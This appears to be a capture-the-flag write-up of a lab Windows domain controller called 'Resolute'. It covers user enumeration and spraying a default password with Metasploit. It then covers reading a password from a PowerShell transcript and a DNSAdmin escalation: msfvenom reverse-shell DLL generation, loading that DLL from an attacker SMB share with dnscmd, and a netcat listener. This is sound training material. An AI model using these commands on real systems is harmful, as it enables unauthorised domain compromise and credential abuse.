--- Resolute is a Windows machine that highlights the danger of default passwords that have not been changed and the recovery of an overly verbose powershell session record.

A privilege escalation is possible with DNSAdmin group. We abuse of membership ryan to gain Administrator right through the possitiblity to inject a malicious DLL in the config of DNS.

### Check all services
***
We find interesting services ; `dns`, `kerberos`, `ldap` and `smb` on their usual ports.

```terminal
$ nmap -A -T5 10.10.10.169 -p-
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-nmap.png" | relative_url }})

### enum4linux
***
Enum4linux is a tool for enumerating information from Windows and Samba systems.

We find many users : `Administrator, Guest, krbtgt, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki`

And one (marko) with password in description : **Welcome123!**

```terminal
$ enum4linux 10.10.10.169
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-enum4linux.png" | relative_url }})

### Vulnerabilities
***
We have much possitiblity to exploit Active-Directory Machine.

Reference - Active-Directory exploit toolbox : <https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md>

Here we have password appear in description of user and are going to exploit it. But the password doesnt match with the user associated (marko). In this situation we can think about a `default password` on the creation of user.

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Using Lazy Password
***
We can test default password on all users found above through `smb_login module` present in `Metasploit`.

```terminal
$ msfconsole
msf5 > search smb_login
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Welcome123!
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /root/Documents/writeups/resolute/userfile.txt
msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.10.169
msf5 auxiliary(scanner/smb/smb_login) > exploit
```

We result the user who always uses the default password.

```terminal
Success: 'MEGABANK.LOCAL\melanie:Welcome123!'
```

We can connect now with `evil-winrm tool` and flag the user to validate the compromission of the system user.

evil-winrm can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

Reference - evil-winrm tool : <https://github.com/Hackplayers/evil-winrm>

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Plaintext Password from transcript Powershell
***
We enum with Melanie account to find interesting user and success a lateral movement.

Hidden folder named `PSTranscripts` is present under `c:\`

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-pstranscript.png" | relative_url }})

We keep going down into it to find a Transcript Powershell.

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-hiddenfile.png" | relative_url }})

This file is the result of record part of a PowerShell session seem realized by Ryan user. We watching his password in a powershell command : **Serv3r4Admin4cc123**

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-openfile.png" | relative_url }})

Again we can now connect on the user ryan with evil-winrm tool.

```terminal
$ ruby evil-winrm.rb -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### DNSAdmin - ACLs abuse
***
Our user is member of `DNSAdmin group`. We can abuse his membership to escalate to Administrator rights and compromise the Active Directory domain through the loading of malicious DLL (payload reverse shell TCP) with SYSTEM privileges.

Reference - exploit DNSADMIN : <https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83>

```terminal
PS c:\Users\ryan\Documents> whoami /groups
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-groups.png" | relative_url }})

#### 1 - Creation of Malicious DLL

We create our malicious DLL with msfvenom by integrating a reverse shell TCP pointing to my IP address of my attacking machine and port 443.

```terminal
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.114.159 LPORT=443 -f dll > pwndnsadmin.dll
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-payload.png" | relative_url }})

#### 2 - Share Malicious DLL

We share our DLL from impact-server on our attacking machine. If we put manually the DLL through evil-winrm, he is delete directly. Maybe AV detect the payload ? So we bypass it to share from smbserver method.

```terminal
$ sudo impacket-smbserver share /home/pcw3r/Documents/writeups/htb/resolute/
```

#### 3 - Injection of Malicious DLL

We inject our malicious DLL as config for DNS.

```terminal
PS c:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.159\share\pwndnsadmin.dll
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-injectdll.png" | relative_url }})

We confirm the adding of the value in regedit.

```terminal
PS c:\Users\ryan\Documents> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name serverlevelplugindll
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-verifpayload.png" | relative_url }})

#### 4 - Attacking machine listening

We listening on port 443 with netcat pending the execution of the payload.

```terminal
$ sudo nc -lnvp 443
```

#### 5 - Execution of payload

dns .exe run under SYTEM privilege. The payload will execute when the service dns restart. This service run under SYSTEM privilege so we will dispose of this right through our attacking machine's listening port 443.

```terminal
PS c:\Users\ryan\Documents> sc.exe stop dns
PS c:\Users\ryan\Documents> sc.exe start dns
```

![Desktop View]({{ "/assets/img/resolute/HTB-Images-Resolute-exploitdll.png" | relative_url }})

We get full control of Resolute machine.
